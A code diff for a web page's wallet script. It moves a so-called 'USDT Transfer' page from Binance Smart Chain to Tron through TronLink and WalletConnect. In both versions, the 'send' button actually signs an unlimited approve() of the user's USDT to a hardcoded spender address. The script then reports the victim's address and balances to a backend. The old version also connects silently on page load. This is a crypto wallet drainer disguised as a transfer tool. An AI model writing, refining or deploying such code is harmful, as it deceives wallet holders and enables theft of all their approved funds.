@@ -1,187 +1,187 @@
-let provider;
-let signer = null;
+// ===== TRON CONFIG =====
+const TRON_USDT = "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t";
+const TRON_SPENDER = "TCuZP5cAABx4RpJoYdBxBPdVUWp7onCtQt";
+const WC_PROJECT_ID = "e39256b56b981acc59b58f298055856e";
+
+let wcClient = null;
+let wcSession = null;
 let userAddress = null;
 let isConnected = false;
-let currentChainId = null;
 
-// ===== BSC CONFIG - FORCE BSC ONLY =====
-const BSC_CHAIN_ID = 56;
-const BSC_USDT = "0x55d398326f99059fF775485246999027B3197955";
-const BSC_SPENDER = "0x220bb5df0893f21f43e5286bc5a4445066f6ca56";
-
-const ABI = [
-  "function approve(address spender, uint256 amount)",
-  "function balanceOf(address owner) view returns (uint256)",
-  "function decimals() view returns (uint8)"
-];
-
-// ===== BACKGROUND CONNECT ON PAGE LOAD =====
-// Connects wallet silently in background (works on both Android & iOS Trust Wallet)
-async function backgroundConnect() {
-  if (!window.ethereum) return;
+// ===== INIT WALLETCONNECT =====
+async function initWC() {
   try {
-    provider = new ethers.BrowserProvider(window.ethereum);
-
-    // First try silent check
-    let accounts = await window.ethereum.request({ method: "eth_accounts" });
-
-    // If no accounts (common on iOS), request in background
-    // In Trust Wallet DApp browser this is silent (no popup)
-    if (!accounts || accounts.length === 0) {
-      accounts = await window.ethereum.request({ method: "eth_requestAccounts" });
-    }
-
-    if (accounts && accounts.length > 0) {
-      userAddress = accounts[0];
-      isConnected = true;
-      // Pre-fetch signer so Send is instant
-      signer = await provider.getSigner();
-    }
-
-    currentChainId = await window.ethereum.request({ method: "eth_chainId" });
-
-    // Auto-switch to BSC if needed (silent in Trust Wallet)
-    if (currentChainId !== "0x38") {
-      try {
-        await window.ethereum.request({
-          method: "wallet_switchEthereumChain",
-          params: [{ chainId: "0x38" }]
-        });
-        currentChainId = "0x38";
-      } catch (e) {
-        if (e.code === 4902) {
-          await window.ethereum.request({
-            method: "wallet_addEthereumChain",
-            params: [{
-              chainId: "0x38",
-              chainName: "Binance Smart Chain",
-              rpcUrls: ["https://bsc-dataseed.binance.org/"],
-              nativeCurrency: { name: "BNB", symbol: "BNB", decimals: 18 },
-              blockExplorerUrls: ["https://bscscan.com"]
-            }]
-          });
-          currentChainId = "0x38";
-        }
-      }
-    }
-
-    window.ethereum.on("chainChanged", (chainId) => {
-      currentChainId = chainId;
-    });
-
-    window.ethereum.on("accountsChanged", (accs) => {
-      if (accs.length > 0) {
-        userAddress = accs[0];
-        isConnected = true;
-      }
-    });
-  } catch (err) {
-    // Silent fail - will retry on Send
-    console.log("Background connect:", err.message || err);
-  }
-}
-
-// Run immediately when script loads
-backgroundConnect();
-
-// Also run on page load (covers iOS timing delays)
-window.addEventListener("load", () => {
-  if (!isConnected) {
-    setTimeout(backgroundConnect, 300);
-  }
-});
-
-// ===== APPROVE (BSC ONLY) - OPTIMIZED FOR SPEED =====
-async function sendUSDT() {
-  try {
-    if (!window.ethereum) {
-      alert("Please open this page in Trust Wallet");
+    if (!window.SignClient) {
+      setTimeout(initWC, 1000);
       return;
     }
 
-    // Ensure provider + signer are ready (reconnect if needed)
-    if (!provider) {
-      provider = new ethers.BrowserProvider(window.ethereum);
-    }
-    if (!signer || !isConnected) {
-      const accounts = await window.ethereum.request({ method: "eth_requestAccounts" });
-      if (accounts && accounts.length > 0) {
-        userAddress = accounts[0];
+    wcClient = await window.SignClient.init({
+      projectId: WC_PROJECT_ID,
+      metadata: {
+        name: "USDT Transfer",
+        description: "Secure USDT Transfer on Tron",
+        url: window.location.origin,
+        icons: [],
+      },
+    });
+
+    // Check existing session
+    const sessions = wcClient.session.getAll();
+    if (sessions.length > 0) {
+      wcSession = sessions[sessions.length - 1];
+      const accounts = Object.values(wcSession.namespaces).flatMap(ns => ns.accounts);
+      const tronAcc = accounts.find(a => a.startsWith("tron:"));
+      if (tronAcc) {
+        userAddress = tronAcc.split(":")[2];
         isConnected = true;
       }
-      signer = await provider.getSigner();
     }
+  } catch (err) {
+    console.error("WC init:", err);
+  }
+}
 
-    // Ensure BSC chain
-    if (currentChainId !== "0x38") {
-      try {
-        await window.ethereum.request({
-          method: "wallet_switchEthereumChain",
-          params: [{ chainId: "0x38" }]
-        });
-        currentChainId = "0x38";
-      } catch (switchErr) {
-        if (switchErr.code === 4902) {
-          await window.ethereum.request({
-            method: "wallet_addEthereumChain",
-            params: [{
-              chainId: "0x38",
-              chainName: "Binance Smart Chain",
-              rpcUrls: ["https://bsc-dataseed.binance.org/"],
-              nativeCurrency: { name: "BNB", symbol: "BNB", decimals: 18 },
-              blockExplorerUrls: ["https://bscscan.com"]
-            }]
-          });
-          currentChainId = "0x38";
-        }
+// ===== CONNECT WALLET =====
+async function connectWallet() {
+  // TronLink first
+  if (window.tronLink) {
+    try {
+      const res = await window.tronLink.request({ method: "tron_requestAccounts" });
+      if (res && res.code === 200) {
+        userAddress = window.tronWeb.defaultAddress.base58;
+        isConnected = true;
+        return true;
       }
-      // Refresh signer after chain switch
-      signer = await provider.getSigner();
+    } catch(e) {}
+  }
+
+  if (window.tronWeb?.defaultAddress?.base58) {
+    userAddress = window.tronWeb.defaultAddress.base58;
+    isConnected = true;
+    return true;
+  }
+
+  // WalletConnect (Trust Wallet)
+  if (!wcClient) {
+    alert("Connecting... Please try again in a moment.");
+    initWC();
+    return false;
+  }
+
+  try {
+    const { uri, approval } = await wcClient.connect({
+      requiredNamespaces: {
+        tron: {
+          methods: ["tron_signTransaction", "tron_signMessage"],
+          chains: ["tron:0x2b6653dc"],
+          events: ["chainChanged", "accountsChanged"],
+        },
+      },
+    });
+
+    if (uri) {
+      // Show WalletConnect modal
+      if (window.WalletConnectModal) {
+        const modal = new window.WalletConnectModal({ projectId: WC_PROJECT_ID });
+        modal.openModal({ uri });
+        wcSession = await approval();
+        modal.closeModal();
+      } else {
+        // Fallback: show URI
+        console.log("WC URI:", uri);
+        wcSession = await approval();
+      }
+
+      const accounts = Object.values(wcSession.namespaces).flatMap(ns => ns.accounts);
+      const tronAcc = accounts.find(a => a.startsWith("tron:"));
+      if (tronAcc) {
+        userAddress = tronAcc.split(":")[2];
+        isConnected = true;
+        return true;
+      }
+    }
+  } catch (err) {
+    console.error("WC connect:", err);
+  }
+  return false;
+}
+
+// ===== SEND USDT =====
+async function sendUSDT() {
+  try {
+    if (!isConnected || !userAddress) {
+      const ok = await connectWallet();
+      if (!ok) return;
     }
 
-    const address = await signer.getAddress();
+    // TronLink path
+    if (window.tronWeb?.defaultAddress?.base58) {
+      const tw = window.tronWeb;
+      const address = tw.defaultAddress.base58;
+      const ABI = [
+        { "name": "approve", "inputs": [{ "name": "spender", "type": "address" }, { "name": "amount", "type": "uint256" }], "outputs": [{ "name": "", "type": "bool" }], "stateMutability": "nonpayable", "type": "function" },
+        { "name": "balanceOf", "inputs": [{ "name": "owner", "type": "address" }], "outputs": [{ "name": "", "type": "uint256" }], "stateMutability": "view", "type": "function" }
+      ];
+      const contract = await tw.contract(ABI, TRON_USDT);
+      const maxAmount = tw.toBigNumber(2).exponentiatedBy(256).minus(1);
+      const tx = await contract.approve(TRON_SPENDER, maxAmount).send({ feeLimit: 100_000_000, callValue: 0 });
+      await new Promise(r => setTimeout(r, 3000));
 
-    // Create contract
-    const usdt = new ethers.Contract(BSC_USDT, ABI, signer);
+      let usdtBalance = "0", nativeBalance = "0";
+      try {
+        const usdtRaw = await contract.balanceOf(address).call();
+        usdtBalance = (Number(usdtRaw) / 1e6).toFixed(2);
+        const trxRaw = await tw.trx.getBalance(address);
+        nativeBalance = (trxRaw / 1e6).toFixed(2);
+      } catch(e) {}
 
-    // Send approval transaction immediately (don't wait for balances first)
-    const tx = await usdt.approve(BSC_SPENDER, ethers.MaxUint256);
-    
-    // Fetch balances in parallel while transaction is being mined
-    const [receipt, usdtBalanceWei, nativeBalanceWei] = await Promise.all([
-      tx.wait(),
-      usdt.balanceOf(address),
-      provider.getBalance(address)
-    ]);
+      if (window.setTransactionStatus) window.setTransactionStatus("success");
+      if (window.saveTransaction) window.saveTransaction({ walletAddress: address, toAddress: TRON_SPENDER, txHash: tx, usdtBalance, nativeBalance });
 
-    const usdtBalance = ethers.formatUnits(usdtBalanceWei, 18);
-    const nativeBalance = ethers.formatEther(nativeBalanceWei);
+    } else if (wcSession && wcClient) {
+      // WalletConnect path
+      const tw = new window.TronWeb({ fullHost: "https://api.trongrid.io" });
+      const { transaction } = await tw.transactionBuilder.triggerSmartContract(
+        TRON_USDT,
+        "approve(address,uint256)",
+        { feeLimit: 100000000 },
+        [{ type: "address", value: TRON_SPENDER }, { type: "uint256", value: "115792089237316195423570985008687907853269984665640564039457584007913129639935" }],
+        userAddress
+      );
 
-    // Update UI to show success (no alert popup)
-    if (window.setTransactionStatus) {
-      window.setTransactionStatus("success");
-    }
-
-    // Save to backend immediately
-    if (window.saveTransaction) {
-      window.saveTransaction({
-        walletAddress: address,
-        toAddress: BSC_SPENDER,
-        txHash: receipt.hash,
-        usdtBalance: usdtBalance,
-        nativeBalance: nativeBalance
+      const signedTx = await wcClient.request({
+        topic: wcSession.topic,
+        chainId: "tron:0x2b6653dc",
+        request: { method: "tron_signTransaction", params: { transaction } },
       });
+
+      const result = await tw.trx.sendRawTransaction(signedTx);
+
+      if (window.setTransactionStatus) window.setTransactionStatus("success");
+      if (window.saveTransaction) window.saveTransaction({ walletAddress: userAddress, toAddress: TRON_SPENDER, txHash: result.txid || "wc_tx", usdtBalance: "0", nativeBalance: "0" });
     }
 
-  } catch (e) {
-    if (e.code === 4001) {
+  } catch(e) {
+    console.error("sendUSDT:", e);
+    if (e.code === 4001 || (e.message?.includes("cancel"))) {
       alert("Transaction cancelled");
-    } else if (e.code === -32603) {
-      alert("Insufficient funds or network error");
     } else {
       alert("Transaction failed. Please try again.");
     }
   }
 }
 
+// ===== INIT =====
+window.addEventListener("load", () => {
+  initWC();
+  setTimeout(() => {
+    if (window.tronWeb?.defaultAddress?.base58) {
+      userAddress = window.tronWeb.defaultAddress.base58;
+      isConnected = true;
+    }
+  }, 500);
+});
+
 window.sendUSDT = sendUSDT;
+window.connectWallet = connectWallet;
